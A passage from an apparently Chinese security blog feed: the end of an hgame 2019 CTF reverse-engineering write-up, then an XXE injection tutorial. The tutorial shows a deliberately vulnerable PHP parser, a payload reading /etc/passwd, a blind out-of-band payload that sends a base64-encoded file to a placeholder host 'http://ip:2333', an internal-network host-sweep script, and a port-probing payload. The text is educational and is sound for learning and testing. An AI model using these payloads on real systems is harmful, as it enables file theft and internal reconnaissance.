b = 95, a = 49, c = 116, d = 104, e = 105]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 114, b = 95, a = 107, c = 77, d = 97, e = 116]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 95, b = 120, a = 49, c = 95, d = 105, e = 115]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 117, b = 101, a = 118, c = 114, d = 121, e = 95]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 125, b = 101, a = 115, c = 102, d = 53, e = 108]</span></span><br><span class="line"></span><br><span class="line">flag = [<span class="number">104</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">123</span>,<span class="number">49</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">107</span>,<span class="number">95</span>,<span class="number">77</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">49</span>,<span class="number">120</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">53</span>,<span class="number">108</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">qwer = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> flag:</span><br><span class="line"></span><br><span class="line">    qwer += chr(q)</span><br><span class="line"></span><br><span class="line">print(qwer)</span><br><span class="line"><span class="comment">#hgame&#123;1_think_Matr1x_is_very_usef5l&#125;</span></span><br></pre></td></tr></table></figure><p>这题对我们这种REbeginner来说很不友好==、</p><h2 id="r-amp-xor"><a href="#r-amp-xor" class="headerlink" title="r &amp; xor"></a>r &amp; xor</h2><blockquote><p>描述<br>论r 与 xor 的重要性 ida里奇怪的大数字?不如按r试一试<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/xor">http://plir4axuz.bkt.clouddn.com/hgame2019/xor</a></p></blockquote><p>IDA打开，选中长数字按<code>r</code>可以将其转成字符</p><p><img src="https://i.loli.net/2019/02/19/5c6bfd7c4d00a.png"></p><p>从有往左读，可以发现这个是一个flag，但是不可能这么简单，没错，这是<code>fake_flag</code>，==、</p><p><code>memset(void *s, int ch,size_t n)</code>需要注意，这个是初始化函数，将s后面n个字节都初始化成ch。</p><p>于是得到<code>0x90/4=144/4=36</code>。即将v6开始后面36个int都初始化为0。作为<code>REbeginner</code>我以为这里除了问题，因为给出的变量不足36个，但是后来经大佬提醒发现，这个要看定义的变量所占的内存，</p><p>一个int是4位，但是<code>v7(bp-118h)</code>和<code>v8(bp-110h)</code>差了8位，就是说，v7和v8之间有两个int，一个是v7,一个是之前初始化的0，之后同理，可以推测出所有的36位数组序列。</p><p><img src="https://i.loli.net/2019/02/19/5c6c021659d83.png"></p><p><img src="https://i.loli.net/2019/02/19/5c6c03a68c893.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[0,0,0,0,0,0,1,0,7,0,92,18,38,11,93,43,11,23,0,23,43,69,6,86,44,54,67,</span><br><span class="line">0,66,85,126,72,85,30,0]</span><br></pre></td></tr></table></figure><p>之后的就简单了，看一下代码逻辑，很简单的异或，再异或一下就可以得到真正的flag</p><p><img src="https://i.loli.net/2019/02/19/5c6c0469ca211.png"></p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; &#39;hgame&#123;Y0u_mayb3_need_th1s_0ne!!!!!&#125;&#39;</span><br><span class="line">v &#x3D; [0,0,0,0,0,0,1,0,7,0,92,18,38,11,93,43,11,23,0,23,43,69,6,86,44,54,67,0,66,85,126,72,85,30,0]</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,35):</span><br><span class="line">flag +&#x3D; chr(ord(s[i])^v[i])</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line">## hgame&#123;X0r_1s_interest1ng_isn&#39;t_it?&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;说来也是有一点感慨的，去年我也是以萌新的身份参加的杭电hgame，我的第一篇博客好像也是那时候写的呢！算是有纪念意义呢，一年来学了一点知识，</summary>
      
    
    
    
    <category term="CTF" scheme="v0w.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>XXE学习笔记</title>
    <link href="v0w.top/2019/01/20/XXE-note/"/>
    <id>v0w.top/2019/01/20/XXE-note/</id>
    <published>2019-01-19T16:00:00.000Z</published>
    <updated>2020-08-28T06:36:12.187Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h1><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，这是一个注入漏洞。注入的是什么？XML外部实体。因此其利用点是 <strong>外部实体</strong> ，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。（相反，单纯的XML注入比较鸡肋。）</p><blockquote><p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p></blockquote><h2 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h2><p>以下内容主要参考<a href="http://www.w3school.com.cn/x.asp">W3School的XML系列教程</a></p><p>要了解XXE，首先要了解XML标记语言。XML标记语言有哪些特征呢？</p><ul><li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li><li>XML 是一种<strong>标记语言</strong>，很类似 HTML</li><li>XML 的设计宗旨是<strong>传输数据</strong>，而非显示数据</li><li>XML 标签没有被预定义。您需要<strong>自行定义标签</strong>。</li><li>XML 被设计为具有<strong>自我描述性</strong>。</li></ul><p>XML 被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML文档用途广泛，最常见的比如订阅一个网站时的<code>rss.xml</code>等。XML本质上就是一段<strong>自我描述的数据</strong>。XML是一种树结构。语法参考链接<a href="http://www.w3school.com.cn/xml/xml_syntax.asp">http://www.w3school.com.cn/xml/xml_syntax.asp</a></p><p>重点语法规则主要有这样几点：</p><ul><li><p>所有 XML 元素都须有关闭标签</p></li><li><p>XML 标签对大小写敏感</p></li><li><p>XML 必须正确地嵌套</p></li><li><p>XML 文档必须有根元素</p></li><li><p>XML 的属性值须加引号</p></li><li><p>如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，一些特殊字符需要转义。</p></li></ul><p>此外，好的XML文档不仅遵循XML的规范，还符合DTD(document type definition)规范。</p><h2 id="什么是DTD？"><a href="#什么是DTD？" class="headerlink" title="什么是DTD？"></a>什么是DTD？</h2><p>所谓的DTD，Document Type Definition，文件类型定义，用来宣告网页的文件类型。举例来说，HTML 有很多版本，如：HTML, HTML2.0, … , XHTML, XHTML5 等，利用&lt;!DOCTYPE&gt; 让浏览器能正确显示内容。</p><p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。可一致地使用某个标准的 DTD 来交换数据。应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。还可以使用 DTD 来验证您自身的数据。</p><p>它使用一系列合法的元素来定义文档结构：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p><strong>内部的 DOCTYPE 声明</strong></p><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>带有 DTD 的 XML 文档实例：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [这是DTD内部声明</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>以上 DTD 解释如下：</strong></p><ul><li><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <em>note</em> 类型的文档。</p></li><li><p><strong>!ELEMENT note</strong> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p></li><li><p><strong>!ELEMENT to</strong> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p><p>(之后类似)</p></li></ul><p><strong>这里有一个小重点Tips：</strong></p><ul><li>“#PCDATA” 类型为被解析的字符数据（parsed character data）。表示读文件按照XML格式进行解析</li><li>“#CDATA”类型为字符数据（character data）。表示读文件但是不用解析，直接读文件的原始内容</li></ul><p><strong>外部文档声明</strong></p><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span># dtd文件的绝对路径</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>其他更多的可能需要读者参考这个链接进行学习<a href="http://www.w3school.com.cn/dtd/index.asp%E3%80%82">http://www.w3school.com.cn/dtd/index.asp。</a></p><p><strong>一个内部实体声明</strong></p><p>语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;test&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>一个外部实体声明</strong></p><p>语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXE-的成因"><a href="#XXE-的成因" class="headerlink" title="XXE 的成因"></a>XXE 的成因</h1><p>上面介绍了这么多，大概才把XXE的基础知识介绍完，接下来，我们具体看一下这个<strong>外部实体注入漏洞</strong>的成因和攻击面。</p><p><strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，如常见的php函数<code>simplexml_load_string()</code>会解析外部实体。我们可以自行定义一个实体名称，并在实体内容中定义要服务器做的行为，从而造成攻击，因此注入点通常是可以输入XML 的位置。</p><h1 id="XXE的攻击面"><a href="#XXE的攻击面" class="headerlink" title="XXE的攻击面"></a>XXE的攻击面</h1><p>那么，我们究竟可以利用XXE做哪些事情呢？下面介绍一下XXE的攻击面。</p><h2 id="1-有回显的任意文件读取"><a href="#1-有回显的任意文件读取" class="headerlink" title="1. 有回显的任意文件读取"></a>1. 有回显的任意文件读取</h2><p>攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们可以控制输入的XML代码造成服务器上任意文件的读取。</p><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-14_00001.png"></p><p>但是直接读文件，在遇到文件内容中含有<code>&lt;</code>,<code>&amp;</code>等未转义的字符时，解析会报错。这是由于XML的外部实体特性导致的，如以下文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;HTML5 rose&lt;&#x2F;title&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190214210529.png"></p><p><strong>解决方案</strong></p><p>前面提到CDATA是将文件当做原始字符串而不进行解析，于是，可以通过 <code>&lt;![CDATA[</code>和 <code>]]&gt;</code>将payload包裹起来，使其不解析为XML就可以读取此类文件了。由于普通实体不能直接拼接，需要先拼接再调用，于是需要利用参数实体。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;e:&#x2F;test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure><p><strong>evil.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/15/5c66bb86897a5.png"></p><p>于是通过<code>XXE</code>和<code>CDATA</code>就基本上实现了任意文件读取。</p><h2 id="2-无回显任意文件读取（Blind-OOB-XXE）"><a href="#2-无回显任意文件读取（Blind-OOB-XXE）" class="headerlink" title="2. 无回显任意文件读取（Blind OOB XXE）"></a>2. 无回显任意文件读取（Blind OOB XXE）</h2><p>通常情况下，xml文件是用于服务器的各项配置的，而不是直接输出的，于是我们需要寻找其他不依托服务器回显的方法来实现任意文件读取。</p><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//相比上一段代码，缺少了回显过程，只有解析过程。</span></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么，利用什么方法来进行无回显的读取呢？</p><p>通过之前的学习，我们知道参数实体是可以合并依次调用的。那么我们可以利用三个参数实体，先去访问VPS的一个<code>evil.dtd</code>，调用<code>evil.dtd</code>的参数去读取服务器的敏感文件，放到一个参数中，再利用最后一个参数实体将文件内容发到VPS的一个端口。</p><p>利用这个思路，我们可以构造这样的payload：</p><p><strong>test.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;e:&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip:2333?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/15/5c66cf1bf405b.png"></p><p><img src="https://i.loli.net/2019/02/15/5c66cefa5b4a8.png"></p><p><strong>需要注意的是</strong>dtd文件中作为内容的一段实体数据需要转义<code>&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://ip:2333?p=%file;&#39;&gt;&quot;</code></p><p>发现虽然无回显，但是依然可以通过这样的方法读取数据。</p><p>笔者通过一个图来理解整个调用过程：</p><p><img src="https://i.loli.net/2019/02/17/5c695e47dc191.png"></p><p>上面说了XXE读文件的两种操作，主要适合利用<code>file</code>协议，攻击方式上有点类似SSRF，通过伪造xml外部实体或者dtd文件来执行，读取服务器上的敏感文件。事实上，我们还可以通过XXE打开内网渗透的大门，下面来学习一下通过XXE进行内网的探测。</p><h2 id="3-http内网探测"><a href="#3-http内网探测" class="headerlink" title="3. http内网探测"></a>3. http内网探测</h2><p>类似的，我们通过读文件的方式判断是否存在内网主机，筛选出内网主机IP。如果能从中读取到内容，那么可以判断这个IP的内网主机是存在的。</p><p>在此之前，还有一个步骤需要完成，即确定内网的网段，时间宝贵，我们应该优先确定内网网段，再查找内网主机IP，所以需要利用XXE读取一些文件如<code>/proc/net/arp</code>，<code>/etc/host</code>等。</p><p>还是利用上面有回显<code>xml.php</code>为例子：</p><p><img src="https://i.loli.net/2019/02/17/5c691efa362df.png"></p><p>读取文件后，基本确定内网网段在<code>192.168.118.0</code></p><p>构建脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># referer: https://xz.aliyun.com/t/3357#toc-11</span></span><br><span class="line">ip_arr=[]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span>(<span class="params">string</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE creds [&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;creds&gt;&amp;xxe;&lt;/creds&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print xml</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_xml</span>(<span class="params">xml</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://192.168.118.144/xxe.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    <span class="keyword">print</span> x</span><br><span class="line">    <span class="comment"># print base64.b64decode(x)</span></span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        ip_arr.append(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = <span class="string">&#x27;192.168.118.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="keyword">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-17_00001.png"></p><h2 id="4-http内网主机端口探测"><a href="#4-http内网主机端口探测" class="headerlink" title="4. http内网主机端口探测"></a>4. http内网主机端口探测</h2><p>关于端口探测，和主机探测是类似的意思，在确定主机IP后，固定IP，利用payload，循环修改端口，查看结果即可。通常情况下，可以根据响应时间/长度/响应数据，攻击者将可以判断该端口是否已被开启。</p><p>比如说，我们确定了一台主机，利用下面的payload，在测试环境下会报错，而且端口开放与未开放的报错不一样，于是可以进行区分(80为开放端口，2333为未开放端口)：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;https://127.0.0.1:83/&quot;</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">data</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-17_00003.png"></p><p><img src="https://i.loli.net/2019/02/18/5c69991fbd04e.png"></p><p>可以利用<code>burpsuite</code>或者写脚本，都可以很轻松的进行端口扫描，但是若想全部扫描，这个过程会比较耗时，也可以构建常用端口字典，进行部分扫描，提高效率。</p><p><img 